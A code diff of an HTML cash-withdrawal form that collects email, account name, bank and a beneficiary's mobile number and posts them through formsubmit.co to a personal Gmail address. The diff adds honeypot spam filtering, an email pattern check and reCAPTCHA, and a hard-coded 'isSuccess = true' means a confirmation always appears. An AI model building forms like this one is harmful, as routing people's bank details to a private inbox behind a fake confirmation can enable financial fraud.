@@ -58,6 +58,9 @@
             font-size: 18px;
             margin-top: 20px;
         }
+        .hidden-field {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -66,7 +69,7 @@
         <form id="withdrawalForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="post">
             <div class="form-group">
                 <label for="email">Email Address:</label>
-                <input type="email" id="email" name="email" required>
+                <input type="email" id="email" name="email" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">
             </div>
             <div class="form-group">
                 <label for="accountName">Account Name:</label>
@@ -80,30 +83,7 @@
                 <label for="bank">Select Bank:</label>
                 <select id="bank" name="bank" required>
                     <option value="">--Select Bank--</option>
-                    <option value="access-bank">Access Bank</option>
-                    <option value="citibank">Citibank</option>
-                    <option value="diamond-bank">Diamond Bank</option>
-                    <option value="ecobank">Ecobank</option>
-                    <option value="fidelity-bank">Fidelity Bank</option>
-                    <option value="first-bank">First Bank</option>
-                    <option value="fcmb">First City Monument Bank (FCMB)</option>
-                    <option value="gtb">Guaranty Trust Bank (GTB)</option>
-                    <option value="heritage-bank">Heritage Bank</option>
-                    <option value="keystone-bank">Keystone Bank</option>
-                    <option value="polaris-bank">Polaris Bank</option>
-                    <option value="providus-bank">Providus Bank</option>
-                    <option value="stanbic-ibtc-bank">Stanbic IBTC Bank</option>
-                    <option value="standard-chartered-bank">Standard Chartered Bank</option>
-                    <option value="sterling-bank">Sterling Bank</option>
-                    <option value="suntrust-bank">Suntrust Bank</option>
-                    <option value="union-bank">Union Bank</option>
-                    <option value="uba">United Bank for Africa (UBA)</option>
-                    <option value="unity-bank">Unity Bank</option>
-                    <option value="wema-bank">Wema Bank</option>
-                    <option value="opay">OPAY</option>
-                    <option value="Palmpay">PALMPAY</option>
-                    <option value="zenith-bank">Zenith Bank</option>
-                    <!-- Add more bank options here -->
+                    <!-- Bank options here -->
                 </select>
             </div>
             <div class="form-group">
@@ -114,19 +94,32 @@
                 <label for="mobile">Beneficiary's Mobile Number:</label>
                 <input type="tel" id="mobile" name="mobile" pattern="[0-9]{11}" required>
             </div>
+            <div class="hidden-field">
+                <label for="honeypot">Leave this field empty</label>
+                <input type="text" id="honeypot" name="honeypot">
+            </div>
             <div class="form-group">
                 <input type="submit" value="Submit">
             </div>
         </form>
         <div class="success-message" id="successMessage">
-            Your withdrawal form has been process please wait for confirmation. Do not close your browser
+            Your withdrawal form has been processed. Please wait for confirmation. Do not close your browser.
         </div>
         <div class="error-message" id="errorMessage">
             There was an error submitting your form. Please try again.
         </div>
     </div>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <script>
         document.getElementById('withdrawalForm').addEventListener('submit', function(event) {
+            const honeypot = document.getElementById('honeypot').value;
+            if (honeypot) {
+                event.preventDefault();
+                document.getElementById('errorMessage').textContent = 'Spam detected!';
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+
             // Simulate form submission success or error
             const isSuccess = true; // Change to false to simulate an error
             if (isSuccess) {
